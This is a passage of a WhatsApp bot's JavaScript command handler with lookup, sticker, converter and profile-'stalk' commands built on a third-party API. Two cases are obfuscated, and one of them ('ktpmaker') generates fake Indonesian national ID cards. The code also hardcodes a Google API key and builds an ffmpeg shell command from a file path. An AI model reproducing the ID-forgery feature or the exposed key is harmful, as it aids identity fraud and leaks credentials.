				tittttttttt += `Link : ${x.link}\n`
				tittttttttt += `Tipe : ${x.tipe}\n`
				tittttttttt += `Published : ${x.waktu}\n\n`
			}
			newReply(tittttttttt)
			}
			break
			
		    case 'infogempa':
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/infogempa?apikey=${apikey}`)
			newReply(mess.wait)
			var caption = `Lokasi : ${data.result.lokasi}\n`
			caption += `Waktu : ${data.result.waktu}\n`
			caption += `Potensi : ${data.result.potensi}\n`
			caption += `Magnitude : ${data.result.magnitude}\n`
			caption += `Kedalaman : ${data.result.kedalaman}\n`
			caption += `Koordinat : ${data.result.koordinat}`
			conn.sendMessage(m.chat, { image: { url: data.result.map }, caption })
			break
			
		    case 'lirik':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Melukis Senja`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/lirik?apikey=${apikey}&query=${full_args}`)
			newReply(data.result)
			break
			
		    case 'infocuaca':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} Yogyakarta`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${args[0]}?apikey=${apikey}`)
			var titttttttttt = `Tempat : ${data.result.tempat}\n`
			titttttttttt += `Cuaca : ${data.result.cuaca}\n`
			titttttttttt += `Angin : ${data.result.angin}\n`
			titttttttttt += `Description : ${data.result.description}\n`
			titttttttttt += `Kelembapan : ${data.result.kelembapan}\n`
			titttttttttt += `Suhu : ${data.result.suhu}\n`
			titttttttttt += `Udara : ${data.result.udara}\n`
			titttttttttt += `Permukaan laut : ${data.result.permukaan_laut}\n`
			conn.sendMessage(m.chat, { location: { degreesLatitude: data.result.latitude, degreesLongitude: data.result.longitude } })
			newReply(titttttttttt)
			}
			break
			
			case 'kodepos':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Slemanan or ${prefix + command} 66154`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/kodepos?apikey=${apikey}&query=${full_args}`)
			var tittttttttttt = `Provinsi : ${data.result[0].province}\n`
			tittttttttttt += `Kabupaten : ${data.result[0].city}\n`
			tittttttttttt += `Kecamatan : ${data.result[0].subdistrict}\n`
			tittttttttttt += `Kelurahan : ${data.result[0].urban}\n`
			tittttttttttt += `Kode Pos : ${data.result[0].postalcode}`
			newReply(tittttttttttt)
			break
			
		    case 'jadwalbola':
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwalbola?apikey=${apikey}`)
			newReply(mess.wait)
			var titttttttttttt = 'Jadwal Bola :\n'
			for (var x of data.result) {
				titttttttttttt += `Pada : ${x.time}\n`
				titttttttttttt += `Event : ${x.event}\n`
				titttttttttttt += `Match : ${x.match}\n`
				titttttttttttt += `TV : ${x.tv}\n\n`
			}
			newReply(titttttttttttt)
			break
			
			// ANIME FITUR
			case 'genshin':
			    function _0x2da7(_0x15819a, _0x3095e4) {
    var _0x58d568 = _0x1462();
    return _0x2da7 = function (_0x355407, _0x21f030) {
        _0x355407 = _0x355407 - (0x1681 + 0x10d4 + -0x2658);
        var _0xa683b9 = _0x58d568[_0x355407];
        return _0xa683b9;
    }, _0x2da7(_0x15819a, _0x3095e4);
}
var _0x582aa0 = _0x2da7;
(function (_0x4615e5, _0xba8d76) {
    var _0x40974d = _0x2da7, _0x2fb6c5 = _0x4615e5();
    while (!![]) {
        try {
            var _0x3f31c2 = parseInt(_0x40974d(0x104)) / (-0xd32 + -0xf9d + 0x734 * 0x4) + parseInt(_0x40974d(0x103)) / (0x1 * 0xe39 + 0x1efe * 0x1 + -0x2d35) + -parseInt(_0x40974d(0x101)) / (0xe6d * 0x1 + 0x14b6 + -0x20 * 0x119) * (parseInt(_0x40974d(0x11a)) / (-0x34e + 0x18a5 + -0x1553)) + parseInt(_0x40974d(0x10e)) / (0x166b + -0x7 * -0x54 + -0x18b2) * (parseInt(_0x40974d(0x115)) / (0x1 * 0x99f + 0x34b + 0x6e * -0x1e)) + -parseInt(_0x40974d(0xfd)) / (0x1b5 + -0x529 * 0x3 + 0x1 * 0xdcd) + parseInt(_0x40974d(0x110)) / (-0x19a1 + 0xeb1 * -0x2 + 0x370b) + parseInt(_0x40974d(0xfe)) / (0x1 * 0x1a7b + 0x1321 * 0x2 + 0x52 * -0xca);
            if (_0x3f31c2 === _0xba8d76)
                break;
            else
                _0x2fb6c5['push'](_0x2fb6c5['shift']());
        } catch (_0x53135a) {
            _0x2fb6c5['push'](_0x2fb6c5['shift']());
        }
    }
}(_0x1462, -0xe808d + 0x15a636 + -0xfa1 * -0x5d));
function _0x1462() {
    var _0x16f74a = [
        'icon',
        '1741590OfdQpX',
        '1114360pfnPdU',
        '?apikey=',
        'enshin/',
        'audio',
        '.xyz/api/g',
        'Example:\x20',
        'title',
        'Icon\x20:\x20',
        'wait',
        'result',
        '110atSApK',
        'get',
        '1454256EhyfOs',
        'cover1',
        'audio/mp4',
        'Name\x20:\x20',
        '\x20jean',
        '47652rUkbvI',
        'Intro\x20:\x20',
        'length',
        'chat',
        'intro',
        '303532Ernnhx',
        'i.lolhuman',
        '11039924zswevv',
        '1366560DwZVjG',
        'https://ap',
        'sendMessag',
        '3ihFiZU'
    ];
    _0x1462 = function () {
        return _0x16f74a;
    };
    return _0x1462();
}
if (args[_0x582aa0(0x117)] == -0x4 * 0x7a3 + 0x16 * -0x4c + 0x2514)
    return newReply(_0x582aa0(0x109) + (prefix + command) + _0x582aa0(0x114));
newReply(mess[_0x582aa0(0x10c)]);
var {data} = await axios[_0x582aa0(0x10f)](_0x582aa0(0xff) + _0x582aa0(0x11b) + _0x582aa0(0x108) + _0x582aa0(0x106) + full_args + _0x582aa0(0x105) + apikey), caption = _0x582aa0(0x113) + data[_0x582aa0(0x10d)][_0x582aa0(0x10a)] + '\x0a';
caption += _0x582aa0(0x116) + data[_0x582aa0(0x10d)][_0x582aa0(0x119)] + '\x0a', caption += _0x582aa0(0x10b) + data[_0x582aa0(0x10d)][_0x582aa0(0x102)] + '\x0a', await conn[_0x582aa0(0x100) + 'e'](m[_0x582aa0(0x118)], {
    'image': { 'url': data[_0x582aa0(0x10d)][_0x582aa0(0x111)] },
    'caption': caption
}), await conn[_0x582aa0(0x100) + 'e'](m[_0x582aa0(0x118)], {
    'audio': { 'url': data[_0x582aa0(0x10d)]['cv'][-0x21d * 0xd + 0x5c4 + 0x15b5][_0x582aa0(0x107)][0x1fff + -0xa74 * 0x2 + -0x11 * 0xa7] },
    'mimetype': _0x582aa0(0x112)
});
			break
			
			case 'listgen':
			newReply(`amber\nayaka\nbaizhu\nbarbara\nbeidou\nbennett\nchilde\nchongyun\ncyno\ndainsleif\ndiluc\ndiona\nfischl\nganyu\njean\nkaeya\nkeqing\nklee\nlisa\nmona\nningguang\nnoelle\nqiqi\nrazor\nsucrose\nventi\nxiangling\nxiao\nxingqiu\nxinyan\nzhongli`)
			break
			
			// CONVERT FITUR
			
			case 'qc': {
            const { quote } = require('./lib/quote.js')
            if (!q) return ('Masukan Text')
            let ppnyauser = await await conn.profilePictureUrl(m.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
            const rest = await quote(q, pushname, ppnyauser)
            newReply(mess.wait)
            conn.sendImageAsSticker(m.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
            }
            break
            
            case 'qcimg': {
            const { quote } = require('./lib/quote.js')
            if (!q) return ('Masukan Text')
            let ppnyauser = await await conn.profilePictureUrl(m.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
            const rest = await quote(q, pushname, ppnyauser)
            newReply(mess.wait)
            conn.sendMessage(m.chat, { image: { url: rest.result }, caption: `Done?`}, {quoted: m})
            }
            break
            
			case 'sticker':
            case 'stiker':
            case 's':{
                if (!quoted) return newReply(`Balas Video/Image Dengan Caption ${prefix + command}`)
                newReply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await conn.sendImageAsSticker(m.chat, media, m, {
                        packname: global.packname,
                        author: global.author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return newReply('Maksimal 10 detik!')
                    let media = await quoted.download()
                    let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, {
                        packname: global.packname,
                        author: global.author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return newReply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
            
            case 'smeme': {
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) return newReply(respond)
            if (!text) return newReply(respond)
	        newReply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await conn.downloadAndSaveMediaMessage(qmsg)
	        let fatGans = await TelegraPh(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
	        let FaTiH = await conn.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	        break
	             
            case 'swm': {
                let [teks1, teks2] = text.split`|`
                if (!teks1) return newReply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
                if (!teks2) return newReply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
            	newReply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await conn.downloadMediaMessage(qmsg)
                    let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return newReply('Maksimal 10 detik!')
                    let media = await conn.downloadMediaMessage(qmsg)
                    let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else {
                    return newReply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
            
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return newReply(`Contoh : ${prefix + command} 😅+🤔`)
                if (!emoji2) return newReply(`Contoh : ${prefix + command} 😅+🤔`)
                newReply(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await conn.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
                
            }
            break
            
            case 'emojimix2': {
                if (!text) return newReply(`Contoh : ${prefix + command} 😅`)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
                for (let res of anu.results) {
                    let encmedia = await conn.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
                
            }
            break
            
            case 'attp':
                try {
                if (args.length == 0) return newReply(`Example: ${prefix + command} YamadaRyosuke`)
                await conn.sendMessage(m.chat, {sticker: {url:`https://api.lolhuman.xyz/api/attp?apikey=${apikey}&text=${full_args}` }}, { quoted: m })
            } catch (e) {
                newReply(mess.error)
            }
            break
            case 'attp2':
                try {
                    if (args.length == 0) return newReply(`Example: ${prefix + command} YamadaRyosuke`)
                    await conn.sendMessage(m.chat, {sticker: {url:`https://api.lolhuman.xyz/api/attp2?apikey=${apikey}&text=${full_args}` }}, { quoted: m })
                } catch (e) {
                    newReply(mess.error)
            }
            break
            case 'ttp':
                try {
                    if (args.length == 0) return newReply(`Example: ${prefix + command} YamadaRyosuke`)
                    await conn.sendMessage(m.chat, {sticker: {url:`https://api.lolhuman.xyz/api/ttp?apikey=${apikey}&text=${full_args}` }}, { quoted: m })
                } catch (e) {
                    newReply(mess.error)
            }
            break
            
            case 'toimage': 
            case 'toimg': {
                if (!/webp/.test(mime)) return newReply(`Reply sticker dengan caption *${prefix + command}*`)
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    conn.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                
            }
            break
	        case 'tomp4': 
	        case 'tovideo': {
                if (!/webp/.test(mime)) return newReply(`Reply stiker dengan caption *${prefix + command}*`)
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
                
            }
            break
            
            case 'toaud': 
            case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
            newReply(mess.wait)
            let media = await conn.downloadMediaMessage(qmsg)
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            
            }
            break
            
            case 'tomp3': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
            newReply(mess.wait)
            let media = await conn.downloadMediaMessage(qmsg)
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By AdrianTzy.mp3`}, { quoted : m })
            
            }
            break
            
            case 'tovn': 
            case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
            newReply(mess.wait)
            let media = await conn.downloadMediaMessage(qmsg)
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            
            }
            break
            
            case 'togif': {
                if (!/webp/.test(mime)) return newReply(`Reply stiker dengan caption *${prefix + command}*`)
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
                
            }
            break
            
	        case 'tourl': {
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    newReply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    newReply(util.format(anu))
                }
                await fs.unlinkSync(media)
                
            }
            break
            
            // Stalk Fitur
            case 'igstalk': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} whyzzxy`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/stalkig/${args[0]}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Username : ${data.result.username}\n`
				caption += `Full Name : ${data.result.fullname}\n`
				caption += `Posts : ${data.result.posts}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Following : ${data.result.following}\n`
				caption += `Bio : ${data.result.bio}`
				conn.sendMessage(m.chat, { image: { url: data.result.photo_profile }, caption })
			})
			
			}
			break

            case 'ttstalk': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} dryan.pu`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Username : ${data.result.username}\n`
				caption += `Nickname : ${data.result.nickname}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Followings : ${data.result.followings}\n`
				caption += `Likes : ${data.result.likes}\n`
				caption += `Video : ${data.result.video}\n`
				caption += `Bio : ${data.result.bio}\n`
				conn.sendMessage(m.chat, { image: { url: data.result.user_picture }, caption })
			})
			
			}
			break
			
			case 'mlstalk': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} 84830127/2169`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/mobilelegend/${args[0]}?apikey=${apikey}`)
			newReply(data.result)
			
			}
			break
			
			case 'ghstalk': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} YamadaRyosuke`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/github/${args[0]}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Name : ${data.result.name}\n`
				caption += `Link : ${data.result.url}\n`
				caption += `Public Repo : ${data.result.public_repos}\n`
				caption += `Public Gists : ${data.result.public_gists}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Following : ${data.result.following}\n`
				caption += `Bio : ${data.result.bio}`
				conn.sendMessage(m.chat, { image: { url: data.result.avatar }, caption })
			})
			
			}
			break
			
		    case 'twstalk': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} jokowi`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/twitter/${args[0]}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Username : ${data.result.screen_name}\n`
				caption += `Name : ${data.result.name}\n`
				caption += `Tweet : ${data.result.tweet}\n`
				caption += `Joined : ${data.result.joined}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Following : ${data.result.following}\n`
				caption += `Like : ${data.result.like}\n`
				caption += `Description : ${data.result.description}`
				conn.sendMessage(m.chat, { image: { url: data.result.profile_picture }, caption })
			})
			
			}
			break
			
			
            
            case 'ktpmaker':
			    function _0x2ead() {
    var _0x3ba631 = [
        '\x20islam|jom',
        '&until=',
        'chat',
        '250ktHpvE',
        'Done?',
        '194768gfMTWI',
        'join',
        '&kabu=',
        'age\x0a\x0aExamp',
        'ipertiwi|f',
        'empat,\x20tan',
        '99-9999|be',
        'Usage:\x20',
        'ten|nama|t',
        '88/test.jp',
        'amdulillah',
        'atamorgana',
        'kan|jl\x20war',
        '1075404PqspZU',
        '\x20nik|provi',
        'http://api',
        'pmaker?api',
        'no\x20kw|hari',
        'sendMessag',
        '&name=',
        'urahan|kec',
        '132123|bum',
        'ikirin\x20dia',
        '96183MnGuey',
        'le:\x20',
        '|indo\x20ori\x20',
        '1081472CdKOVS',
        'amin|jalan',
        'erlaku\x20sam',
        'lum\x20ditemu',
        '&nikah=',
        '16yliHvw',
        'pai|url_im',
        'doyo|999/9',
        '.lolhuman.',
        'nsi|kabupa',
        '&camat=',
        '|LoL\x20Human',
        '&lurah=',
        'imtuni|alh',
        'length',
        '|mars,\x2099-',
        'prem',
        'split',
        'xyz/api/kt',
        '\x20kiamat|ht',
        'tps://i.ib',
        '|jenis\x20kel',
        '|rt/rw|kel',
        '&agama=',
        'b.co/Xb2pZ',
        '206tpymqX',
        '5KqXiTS',
        '&jk=',
        '&warga=',
        '&kerja=',
        'rjaan|warg',
        '1191654buztxt',
        '&ttl=',
        '\x20456127893',
        '&rtrw=',
        '&nik=',
        '&jl=',
        'amatan|aga',
        '&img=',
        'wait',
        'ma|status\x20',
        '1031988tXAvFI',
        'a\x20negara|b',
        '483MpAiMb',
        'ggal\x20lahir',
        '&prov=',
        'nikah|peke',
        'blo\x20kack|m',
        '99|turese|',
        'key='
    ];
    _0x2ead = function () {
        return _0x3ba631;
    };
    return _0x2ead();
}
var _0x169df1 = _0x361b;
function _0x361b(_0x39d77c, _0x5ad569) {
    var _0x555c9b = _0x2ead();
    return _0x361b = function (_0x263b81, _0x1ff247) {
        _0x263b81 = _0x263b81 - (-0x202d + -0x10 * 0x35 + 0x2514);
        var _0x370f08 = _0x555c9b[_0x263b81];
        return _0x370f08;
    }, _0x361b(_0x39d77c, _0x5ad569);
}
(function (_0x3e3d54, _0xfb5db9) {
    var _0x1dd11c = _0x361b, _0x1776a0 = _0x3e3d54();
    while (!![]) {
        try {
            var _0x3dd9c2 = parseInt(_0x1dd11c(0x1c7)) / (0x17c9 + -0x14cb + 0x3 * -0xff) + parseInt(_0x1dd11c(0x1a9)) / (0xe8f + 0x927 + -0x17b4) * (-parseInt(_0x1dd11c(0x1bb)) / (-0x166d + 0x1ed7 + -0x867)) + -parseInt(_0x1dd11c(0x1b9)) / (0x1 * 0x7ea + -0x5d * -0x16 + 0x3f9 * -0x4) + -parseInt(_0x1dd11c(0x1aa)) / (0x13 * 0x35 + -0x923 * -0x1 + 0xd0d * -0x1) * (-parseInt(_0x1dd11c(0x1af)) / (0x1cde + -0x48f + 0x1849 * -0x1)) + -parseInt(_0x1dd11c(0x1e1)) / (0x8f4 * 0x1 + -0x35 * -0x42 + -0x1697) * (parseInt(_0x1dd11c(0x1e6)) / (-0x97 * -0x8 + -0x1a4d + 0xb * 0x1f7)) + parseInt(_0x1dd11c(0x1de)) / (0xb2 * 0x24 + 0x1 * 0xb92 + -0x2491) * (parseInt(_0x1dd11c(0x1c5)) / (0xd7c + -0xc17 * -0x1 + -0x1 * 0x1989)) + parseInt(_0x1dd11c(0x1d4)) / (-0x1 * -0x17bf + 0x100c + -0x27c0);
            if (_0x3dd9c2 === _0xfb5db9)
                break;
            else
                _0x1776a0['push'](_0x1776a0['shift']());
        } catch (_0x576d45) {
            _0x1776a0['push'](_0x1776a0['shift']());
        }
    }
}(_0x2ead, -0x109 * 0x3a9 + 0x192bb * 0x1 + 0x9 * 0x8ade));
if (!isPremium)
    newReply(mess[_0x169df1(0x1a0)]);
if (args[_0x169df1(0x19e)] == -0x7f * 0x1a + 0x60a + 0x2 * 0x36e)
    return newReply(_0x169df1(0x1ce) + (prefix + command) + (_0x169df1(0x1d5) + _0x169df1(0x199) + _0x169df1(0x1cf) + _0x169df1(0x1cc) + _0x169df1(0x1bc) + _0x169df1(0x1a5) + _0x169df1(0x1e2) + _0x169df1(0x1a6) + _0x169df1(0x1db) + _0x169df1(0x1b5) + _0x169df1(0x1b8) + _0x169df1(0x1be) + _0x169df1(0x1ae) + _0x169df1(0x1ba) + _0x169df1(0x1e3) + _0x169df1(0x1e7) + _0x169df1(0x1ca) + _0x169df1(0x1df)) + (prefix + command) + (_0x169df1(0x1b1) + _0x169df1(0x1dc) + _0x169df1(0x1cb) + _0x169df1(0x1d2) + _0x169df1(0x19b) + _0x169df1(0x19f) + _0x169df1(0x1cd) + _0x169df1(0x1e4) + _0x169df1(0x1d3) + _0x169df1(0x197) + _0x169df1(0x1c0) + _0x169df1(0x19d) + _0x169df1(0x1d1) + _0x169df1(0x1c2) + _0x169df1(0x1bf) + _0x169df1(0x1dd) + _0x169df1(0x1e0) + _0x169df1(0x1d8) + _0x169df1(0x1a3) + _0x169df1(0x1a4) + _0x169df1(0x1a8) + _0x169df1(0x1d0) + 'g'));
newReply(mess[_0x169df1(0x1b7)]), get_args = args[_0x169df1(0x1c8)]('\x20')[_0x169df1(0x1a1)]('|'), nik = get_args[0x1f0c * 0x1 + 0x1cb1 + 0x175 * -0x29], prov = get_args[-0xe0b + -0x174 + 0xf80], kabu = get_args[0x15f1 + 0x2 * 0xa7 + -0x173d * 0x1], name = get_args[-0x289 * -0x9 + -0x1d88 + 0x52 * 0x15], ttl = get_args[-0x2a * -0x8d + -0x3 * -0x589 + -0x27b9], jk = get_args[-0x20d1 + 0x673 * -0x2 + 0x2dbc], jl = get_args[0x828 + -0xad3 + 0x2b1], rtrw = get_args[-0x42c * 0x7 + -0x12cf + 0x300a], lurah = get_args[0x78b * 0x1 + -0x10 * 0x1f5 + 0x2a5 * 0x9], camat = get_args[-0xc * 0x4a + -0x3 * -0x96d + -0x2 * 0xc63], agama = get_args[0x4 * -0x6cd + 0x1a12 + 0x12c], nikah = get_args[-0x1f * 0xfa + 0x15b6 + -0x1 * -0x89b], kerja = get_args[0x3a8 * 0x8 + -0xaa8 + -0x128c], warga = get_args[0x13fa + 0x10c1 + -0x24ae], until = get_args[-0x2662 * 0x1 + -0x17c2 + 0x2 * 0x1f19], img = get_args[-0x14db + -0x3 * 0x6a1 + 0x28cd], ini_buffer = await getBuffer(_0x169df1(0x1d6) + _0x169df1(0x198) + _0x169df1(0x1a2) + _0x169df1(0x1d7) + _0x169df1(0x1c1) + apikey + _0x169df1(0x1b3) + nik + _0x169df1(0x1bd) + prov + _0x169df1(0x1c9) + kabu + _0x169df1(0x1da) + name + _0x169df1(0x1b0) + ttl + _0x169df1(0x1ab) + jk + _0x169df1(0x1b4) + jl + _0x169df1(0x1b2) + rtrw + _0x169df1(0x19c) + lurah + _0x169df1(0x19a) + camat + _0x169df1(0x1a7) + agama + _0x169df1(0x1e5) + nikah + _0x169df1(0x1ad) + kerja + _0x169df1(0x1ac) + warga + _0x169df1(0x1c3) + until + _0x169df1(0x1b6) + img), conn[_0x169df1(0x1d9) + 'e'](m[_0x169df1(0x1c4)], {
    'image': { 'url': ini_buffer },
    'caption': _0x169df1(0x1c6)
}, { 'quoted': m });
            break
            
		    case 'darkjoke':
			newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/meme/darkjoke?apikey=${apikey}`}, caption: `Done?`}, {quoted: m})
            break

			case 'randommeme':
			newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url:  `https://api.lolhuman.xyz/api/random/meme?apikey=${apikey}`}, caption: `Done?`}, {quoted: m})
            break
            
			case 'memeindo':
                newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/meme/memeindo?apikey=${apikey}`}, caption: `Done?`}, {quoted: m})
            break
			
			
			// Ramdon Foto
			case 'art':
            case 'bts':
            case 'exo':
            case 'elf':
            case 'loli':
            case 'neko':
            case 'waifu':
            case 'shota':
            case 'husbu':
            case 'sagiri':
            case 'shinobu':
            case 'megumin':
            case 'wallnime': {
				if (!isPremium) return newReply(mess.prem)
				newReply(mess.wait)
				conn.sendMessage(m.chat, { image: { url: `http://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`}, caption: `Random image for ${command}`})
		    }
	        break
	        
	        // Creator Image
	        case 'bucinsertifikat':
		    case 'sertifikatbucin':
			case 'bucincert':
				if (args.length == 0) return newReply(`Example: ${prefix + command} Justimun Kentod`)
				newReply(mess.wait)
				kueri = args.join(" ")
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/bucinserti?apikey=${apikey}&name=${kueri}`}, caption: 'Sertifikatnya kack'}, {quoted: m})
            break
            
			case 'tololsert':
			case 'tololcert':
			case 'tololsertifikat':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Justimun Kentod`)
			newReply(mess.wait)
			ytta = args.join(" ")
            conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/toloserti?apikey=${apikey}&name=${ytta}`}, caption: 'Sertifikatnya kack'}, {quoted: m})
            break
            
			case 'pacarsertifikat':
			case 'pacarcert':
            if (args.length == 0) return newReply(`Usage: ${prefix + command} nama1|nama2`)
            newReply(mess.wait)
                get_args = args.join(" ").split("|")
                nik = get_args[0]
                prov = get_args[1]
			    titidnya = `Selamat yaa ${nik} ❤️ ${prov}`
            conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/pacarserti?apikey=${apikey}&name1=${nik}&name2=${prov}`}, caption: titidnya}, {quoted: m})
            break
	        
	        case 'carbon':
	            if (!q) return newReply(`Example: ${prefix + command} const adrian = required('adrian-api')`)
	            newReply(mess.wait)
	            conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/carbon?apikey=${apikey}&code=${q}&language=nodejs`}, caption: `Created By YamadaRyosuke\n\n\nCode:\n\n${q}`}, {quoted: m})
	        break
	     
	    // Ephoto1
	    case 'wetglass':
		case 'multicolor3d':
		case 'watercolor':
		case 'luxurygold':
		case 'galaxywallpaper':
		case 'lighttext':
		case 'beautifulflower':
		case 'puppycute':
		case 'royaltext':
		case 'heartshaped':
		case 'birthdaycake':
		case 'galaxystyle':
		case 'hologram3d':
		case 'greenneon':
		case 'glossychrome':
		case 'greenbush':
		case 'metallogo':
		case 'noeltext':
		case 'glittergold':
		case 'textcake':
		case 'starsnight':
		case 'wooden3d':
		case 'textbyname':
		case 'writegalacy':
		case 'galaxybat':
		case 'snow3d':
		case 'birthdayday':
		case 'goldplaybutton':
		case 'silverplaybutton':
		case 'freefire':
			if (args.length == 0) return reply(`Example: ${prefix + command} YamadaRyosuke `)
			if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${apikey}&text=${args}`}, caption: `Created By AdrianTzy\n\n Type: ${command}\n\nText: ${args}`})
			break

        case 'shadow':
		case 'cup':
		case 'cup1':
		case 'romance':
		case 'smoke':
		case 'burnpaper':
		case 'lovemessage':
		case 'undergrass':
		case 'love':
		case 'coffe':
		case 'woodheart':
		case 'woodenboard':
		case 'summer3d':
		case 'wolfmetal':
		case 'nature3d':
		case 'underwater':
		case 'golderrose':
		case 'summernature':
